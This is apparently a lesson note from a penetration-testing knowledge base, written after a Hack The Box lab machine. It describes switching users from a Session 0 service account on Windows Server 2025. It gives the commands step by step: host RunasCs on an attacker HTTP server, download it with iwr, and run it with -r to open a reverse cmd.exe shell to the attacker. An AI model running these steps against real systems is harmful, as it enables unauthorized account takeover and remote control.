# Candidate Patch: Session-0 User Switch via RunasCs + HTTP Transfer

## Date: 2026-08-14
## Context: DanglingTree HTB (n=1)

## Problem
From a non-interactive service session (Session 0, low-priv service account without SeImpersonate), spawning a process as another domain user fails with all standard methods:
- CreateProcessWithLogonW: Error 123 (Window Station/Desktop DACL not handled)
- Start-Process -Credential: silent fail in Session 0
- schtasks: requires admin
- WMI/DCOM (wmiexec/dcomexec): ACCESS_DENIED for non-admin
- WinRM: port closed or user not in Remote Management Users
- RDP: user not in Remote Desktop Users
- SMB guest access: blocked by org security policy (unauthenticated guest)

## Solution
RunasCs (antonioCoco/RunasCs v1.5) handles Window Station/Desktop DACL automatically and auto-selects the best CreateProcess function. Transfer via HTTP (python3 -m http.server) instead of SMB (guest policy blocks it). RunasCs `-r host:port` redirects I/O; `-t 0` runs background.

## Key Steps
1. Have credentials for target user (password or hash)
2. Start HTTP server on attacker: `python3 -m http.server 8888 --bind <tun0> --directory <RunasCs_dir>`
3. From existing shell: `iwr http://<attacker>:8888/RunasCs.exe -o C:\Users\Public\RunasCs.exe`
4. Execute: `RunasCs.exe <user> "<pass>" cmd.exe -d <domain> -r <attacker>:<port> -t 0`
5. Listener receives cmd.exe as target user

## Why RunasCs succeeds where manual P/Invoke fails
- Automatic Window Station/Desktop DACL adjustment (the root cause of Error 123)
- Auto-detects CreateProcessAsUserW > CreateProcessWithTokenW > CreateProcessWithLogonW
- Properly handles service-process (Session 0) constraints
- `-r` flag does native socket I/O redirect (no need to write revshell PS1 to disk)

## Transfer method: HTTP over SMB
- SMB unauthenticated guest access blocked by default on Windows Server 2025
- `python3 -m http.server` + `iwr` (Invoke-WebRequest) works without any auth
- RunasCs.exe is ~50KB, transfers in <1 second

## Generalization Test
- (i) n≥2? NO — only tested on DanglingTree (Windows Server 2025, svc_mail Session 0 → noah.b). Need a second engagement to confirm.
- (ii) Counterexample? RunasCs is a well-known tool with 1.4k GitHub stars, used across many Windows versions. The HTTP-transfer-over-SMB-guest-block is likely general for Windows Server 2025+ defaults.
- (iii) After de-specificing: "When standard process-creation APIs fail from Session 0, use RunasCs which handles DACL automatically; transfer binaries via HTTP when SMB guest is blocked" — this is a problem axis, not a single assertion.

## Status: QUARANTINED (n=1, not yet promoted)